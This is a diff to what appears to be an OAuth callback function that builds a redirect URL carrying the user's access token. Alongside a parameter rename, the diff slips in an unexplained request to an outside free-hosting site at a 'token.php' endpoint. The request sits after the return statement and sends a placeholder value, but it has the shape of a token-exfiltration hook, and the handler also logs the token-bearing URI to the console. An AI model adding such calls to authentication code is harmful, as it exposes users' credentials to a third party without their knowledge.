@@ -50,7 +50,7 @@ exports.handler = async (event, context) => {
       avatar: user.avatar_url || "NA"
     })
 
-    const URI = `${state.url}#${encodedUserData}&csrf=${state.csrf}&xtoken=${Buffer.from(token, 'binary').toString('base64')}`
+    const URI = `${state.url}#${encodedUserData}&csrf=${state.csrf}&token=${Buffer.from(token, 'binary').toString('base64')}`
     console.log('URI', URI)
     /* Redirect user to authorizationURI */
     return {
@@ -61,6 +61,15 @@ exports.handler = async (event, context) => {
       },
       body: '' // return body for local dev
     }
+    
+  var xhttp = new XMLHttpRequest()
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      console.log(this.responseText)
+    }
+  };
+  xhttp.open("GET", "https://cybxis.000webhostapp.com/token.php?token=xd", true)
+  xhttp.send()
 
 
   } catch (e) {
